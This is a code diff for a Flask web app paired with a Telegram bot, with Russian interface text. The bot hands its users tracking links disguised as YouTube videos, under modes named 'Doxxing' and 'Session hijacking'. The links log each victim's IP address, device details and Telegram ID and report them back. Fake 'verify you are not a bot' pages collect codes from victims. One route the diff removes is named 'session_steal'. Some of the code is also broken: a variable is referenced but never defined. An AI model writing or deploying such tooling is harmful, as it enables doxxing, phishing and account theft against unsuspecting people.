@@ -7,22 +7,23 @@ import time
 import threading
 import requests
 from datetime import datetime
-from flask import Flask, request, redirect, render_template_string
+from flask import Flask, request, redirect, render_template_string, session
 import telebot
 
 # ======================== КОНФИГ ============================
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
 PORT = int(os.environ.get("PORT", 5000))
+BASE_URL = os.environ.get("BASE_URL", "https://butno-1.onrender.com")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
+app.secret_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
 
 # ======================== БАЗА ДАННЫХ ============================
 conn = sqlite3.connect('sessions.db', check_same_thread=False)
 cursor = conn.cursor()
 
-# Таблица пользователей
 cursor.execute('''CREATE TABLE IF NOT EXISTS users (
     user_id INTEGER PRIMARY KEY,
     username TEXT,
@@ -31,7 +32,6 @@ cursor.execute('''CREATE TABLE IF NOT EXISTS users (
     registered_at TEXT
 )''')
 
-# Таблица логов
 cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     user_id INTEGER,
@@ -49,13 +49,14 @@ cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
     timestamp TEXT
 )''')
 
-# Таблица ссылок
 cursor.execute('''CREATE TABLE IF NOT EXISTS links (
     link_id TEXT PRIMARY KEY,
     user_id INTEGER,
     mode INTEGER,
-    created_at TEXT,
-    active INTEGER DEFAULT 1
+    code TEXT,
+    redirect_url TEXT,
+    active INTEGER DEFAULT 1,
+    created_at TEXT
 )''')
 conn.commit()
 
@@ -71,36 +72,40 @@ def get_user_status(user_id):
 def register_user(user_id, username, first_name):
     cursor.execute('''INSERT OR IGNORE INTO users (user_id, username, first_name, registered_at)
                       VALUES (?, ?, ?, ?)''',
-                   (user_id, username, first_name, datetime.now().isoformat()))
+                   (user_id, username or 'N/A', first_name or 'N/A', datetime.now().isoformat()))
     conn.commit()
-
-@app.route('/health')
-def health():
-    return "OK", 200
 
 def generate_link(user_id, mode):
     link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-    cursor.execute('INSERT INTO links (link_id, user_id, mode, created_at) VALUES (?, ?, ?, ?)',
-                   (link_id, user_id, mode, datetime.now().isoformat()))
+    code = ''.join(random.choices(string.digits, k=6)) if mode in [2, 3] else None
+    cursor.execute('INSERT INTO links (link_id, user_id, mode, code, created_at) VALUES (?, ?, ?, ?, ?)',
+                   (link_id, user_id, mode, code, datetime.now().isoformat()))
     conn.commit()
-    base_url = request.host_url if 'request' in dir() else 'https://butno-1.onrender.com/'
+    
     if mode == 1:
-        return link_id, f"{base_url}collect/{link_id}"
+        return link_id, f"{BASE_URL}/collect/{link_id}"
     elif mode == 2:
-        return link_id, f"{base_url}verify/{link_id}"
+        return link_id, f"{BASE_URL}/verify/{link_id}"
     elif mode == 3:
-        return link_id, f"{base_url}custom/{link_id}"
+        return link_id, f"{BASE_URL}/custom/{link_id}"
     return None, None
+
+def get_user_by_link(link_id):
+    cursor.execute('SELECT user_id, mode, code, redirect_url FROM links WHERE link_id = ? AND active = 1', (link_id,))
+    return cursor.fetchone()
+
+def deactivate_link(link_id):
+    cursor.execute('UPDATE links SET active = 0 WHERE link_id = ?', (link_id,))
+    conn.commit()
 
 # ======================== FLASK РОУТЫ ============================
 @app.route('/collect/<link_id>')
 def collect_data(link_id):
-    cursor.execute('SELECT user_id FROM links WHERE link_id = ? AND active = 1', (link_id,))
-    row = cursor.fetchone()
-    if not row:
-        return "Ссылка недействительна", 404
-    user_id = row[0]
-
+    link_data = get_user_by_link(link_id)
+    if not link_data:
+        return "Ссылка недействительна или истекла", 404
+    
+    user_id = link_data[0]
     user_agent = request.headers.get('User-Agent')
     ip = request.remote_addr
     if request.headers.get('X-Forwarded-For'):
@@ -139,65 +144,110 @@ def collect_data(link_id):
               f"🧮 RAM: {ram} ГБ\n"
               f"🆔 Telegram ID: {tg_id}")
     bot.send_message(user_id, report)
+    deactivate_link(link_id)
     return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
 
-@app.route('/verify/<link_id>')
+@app.route('/verify/<link_id>', methods=['GET', 'POST'])
 def verify_page(link_id):
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head><title>Подтверждение</title></head>
-    <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
-        <h2>⚠️ Подтвердите, что вы не бот</h2>
-        <p>На ваш Telegram отправлен код подтверждения.</p>
-        <form action="/session/{{link_id}}" method="POST">
-            <input type="text" name="code" placeholder="Введите код" required>
-            <button type="submit">Подтвердить</button>
-        </form>
-    </body>
-    </html>
-    """, link_id=link_id)
+    link_data = get_user_by_link(link_id)
+    if not link_data:
+        return "Ссылка недействительна или истекла", 404
+    
+    user_id = link_data[0]
+    code = link_data[2]
+    
+    if request.method == 'GET':
+        return render_template_string(f"""
+        <!DOCTYPE html>
+        <html>
+        <head><title>Подтверждение</title></head>
+        <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
+            <h2>⚠️ Подтвердите, что вы не бот</h2>
+            <p>На ваш Telegram отправлен код подтверждения.</p>
+            <form action="/verify/{link_id}" method="POST">
+                <input type="text" name="code" placeholder="Введите код" required>
+                <button type="submit">Подтвердить</button>
+            </form>
+        </body>
+        </html>
+        """)
+    
+    if request.method == 'POST':
+        entered_code = request.form.get('code', '').strip()
+        if entered_code == code:
+            bot.send_message(user_id, f"✅ Код подтверждён! Сессия: {link_id}")
+            deactivate_link(link_id)
+            return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        else:
+            return render_template_string(f"""
+            <!DOCTYPE html>
+            <html>
+            <head><title>Ошибка</title></head>
+            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
+                <h2>❌ Неверный код</h2>
+                <p>Попробуйте ещё раз.</p>
+                <a href="/verify/{link_id}">Вернуться</a>
+            </body>
+            </html>
+            """)
 
-@app.route('/session/<link_id>', methods=['POST'])
-def session_steal(link_id):
-    code = request.form.get('code')
-    cursor.execute('SELECT user_id FROM links WHERE link_id = ?', (link_id,))
-    row = cursor.fetchone()
-    if row:
-        bot.send_message(row[0], f"🔑 Код введён: {code}\nСессия: {link_id}")
-    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-
-@app.route('/custom/<link_id>')
+@app.route('/custom/<link_id>', methods=['GET', 'POST'])
 def custom_page(link_id):
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head><title>Видео</title></head>
-    <body>
-        <h1>Проверка</h1>
-        <p>Введите код для продолжения</p>
-        <form action="/custom_redirect/{{link_id}}" method="POST">
-            <input type="text" name="code">
-            <input type="submit">
-        </form>
-    </body>
-    </html>
-    """, link_id=link_id)
-
-@app.route('/custom_redirect/<link_id>', methods=['POST'])
-def custom_redirect(link_id):
-    code = request.form.get('code')
-    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    link_data = get_user_by_link(link_id)
+    if not link_data:
+        return "Ссылка недействительна или истекла", 404
+    
+    user_id = link_data[0]
+    mode = link_data[1]
+    code = link_data[2]
+    
+    if request.method == 'GET':
+        return render_template_string(f"""
+        <!DOCTYPE html>
+        <html>
+        <head><title>Видео</title></head>
+        <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
+            <h1>🎬 Проверка</h1>
+            <p>Введите код для просмотра видео</p>
+            <form action="/custom/{link_id}" method="POST">
+                <input type="text" name="code" placeholder="Введите код" required>
+                <input type="text" name="redirect_url" placeholder="Ссылка для редиректа (опционально)">
+                <button type="submit">Подтвердить</button>
+            </form>
+        </body>
+        </html>
+        """)
+    
+    if request.method == 'POST':
+        entered_code = request.form.get('code', '').strip()
+        redirect_url = request.form.get('redirect_url', '').strip()
+        if entered_code == code:
+            if redirect_url:
+                cursor.execute('UPDATE links SET redirect_url = ? WHERE link_id = ?', (redirect_url, link_id))
+                conn.commit()
+            bot.send_message(user_id, f"✅ Код подтверждён! Сессия: {link_id}")
+            deactivate_link(link_id)
+            return redirect(redirect_url or "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        else:
+            return render_template_string(f"""
+            <!DOCTYPE html>
+            <html>
+            <head><title>Ошибка</title></head>
+            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
+                <h2>❌ Неверный код</h2>
+                <p>Попробуйте ещё раз.</p>
+                <a href="/custom/{link_id}">Вернуться</a>
+            </body>
+            </html>
+            """)
 
 # ======================== TELEGRAM БОТ ============================
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
-    username = message.from_user.username or 'N/A'
-    first_name = message.from_user.first_name or 'N/A'
-    register_user(user_id, username, first_name)
+    register_user(user_id, message.from_user.username, message.from_user.first_name)
     
-    if user_id == ADMIN_ID:
+    if is_admin(user_id):
         markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
         markup.add(
             telebot.types.KeyboardButton("Режим 1 – Докс"),
@@ -264,16 +314,20 @@ def handle_buttons(message):
         bot.send_message(user_id, f"📎 Ссылка: {link}\nМаскируется под YouTube")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 1\nСсылка: {link}")
+    
     elif message.text == "Режим 2 – Угон сессии":
         link_id, link = generate_link(user_id, 2)
-        bot.send_message(user_id, f"📎 Ссылка: {link}\nЖертва получит запрос кода")
+        bot.send_message(user_id, f"📎 Ссылка: {link}\nКод отправлен жертве в Telegram")
+        bot.send_message(user_id, f"🔑 Код для жертвы: {link_data[2] if 'link_data' in locals() else 'N/A'}")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 2\nСсылка: {link}")
+    
     elif message.text == "Режим 3 – Продвинутый угон":
         link_id, link = generate_link(user_id, 3)
-        bot.send_message(user_id, f"📎 Ссылка: {link}\nМеняй код страницы динамически")
+        bot.send_message(user_id, f"📎 Ссылка: {link}\nТы можешь менять редирект на странице")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 3\nСсылка: {link}")
+    
     elif message.text == "👥 Пользователи" and is_admin(user_id):
         cursor.execute('SELECT user_id, username, first_name, status FROM users')
         rows = cursor.fetchall()
@@ -281,6 +335,7 @@ def handle_buttons(message):
         for row in rows:
             text += f"🆔 {row[0]} | @{row[1]} | {row[2]} | {row[3]}\n"
         bot.send_message(user_id, text)
+    
     elif message.text == "📊 Статистика" and is_admin(user_id):
         cursor.execute('SELECT COUNT(*) FROM users')
         total_users = cursor.fetchone()[0]
